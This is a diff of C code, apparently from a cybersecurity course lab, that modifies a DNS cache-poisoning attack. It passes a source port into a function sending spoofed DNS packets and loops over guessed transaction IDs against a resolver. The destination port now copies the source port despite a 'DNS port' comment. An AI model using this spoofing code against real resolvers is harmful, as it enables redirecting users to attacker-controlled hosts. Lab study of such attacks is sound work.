@@ -607,11 +607,11 @@ int build_dns_payload(uint8_t *buffer, const char *hostname, uint16_t txid, uint
     return ptr - buffer; // Return the size of the payload
 }
 
-int full_send_spoofed_dns(uint txid) {
+int full_send_spoofed_dns(uint txid, uint source_port) {
     const char *src_ip = "192.168.1.204";  // Custom source IP
     const char *dest_ip = "192.168.1.203"; // Resolver IP
-    int src_port = 1234;                  // Custom source port
-    int dest_port = 53;                    // DNS port
+    int src_port = source_port;                  // Custom source port
+    int dest_port = source_port;                    // DNS port
 
     uint8_t dns_payload[BUFFER_SIZE];
     int dns_payload_size = build_dns_payload(dns_payload, "www.example.cybercourse.com", txid, 1); // Query for A record
@@ -839,7 +839,7 @@ void run_attack(uint32_t *txid_ls) {
     sleep(0.2);
     for (int i = 0; i < 10; i++) {
         // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
-        full_send_spoofed_dns(txid_ls[i]);
+        full_send_spoofed_dns(txid_ls[i], source_port);
         // send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
     }
     
